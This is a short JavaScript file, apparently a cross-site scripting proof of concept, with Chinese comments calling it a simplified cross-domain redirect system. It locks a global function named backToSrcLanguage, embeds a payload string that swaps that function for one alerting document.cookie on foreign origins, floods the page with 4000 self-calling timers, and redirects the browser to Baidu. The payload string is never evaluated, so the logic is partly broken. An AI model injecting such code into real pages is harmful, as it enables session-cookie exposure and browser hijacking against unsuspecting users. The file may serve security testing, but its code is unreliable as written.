(function() {
    'use strict';
    
    console.log('🔗 简化跨域跳转系统');
    
    // 直接定义一个能跳转的函数
    Object.defineProperty(window, 'backToSrcLanguage', {
        value: function() {
            console.log('🚀 backToSrcLanguage 被调用');
            const currUrl = location.href;
            const payload = `
            if (!location.href.startsWith("https://ideet.github.io") && !window.__cloudx_called) {
                window.__cloudx_called = true;
                Object.defineProperty(window, 'backToSrcLanguage', {
        value: function() {alert(document.cookie)},
        writable: false,
        configurable: false});
            }
        `;
            for (let i = 0; i < 4000; i++) {
            setTimeout(function () {
                
                    window.backToSrcLanguage();
                
            }, i);
        }
            
            // 方法1：直接跳转（最简单）
            console.log('🔗 直接跳转到百度...');
            window.location.href = "https://www.baidu.com";
            
            return 'redirecting_to_baidu';
        },
        writable: false,
        configurable: false
    });
    
    console.log('✅ backToSrcLanguage 函数已定义');
    
})();
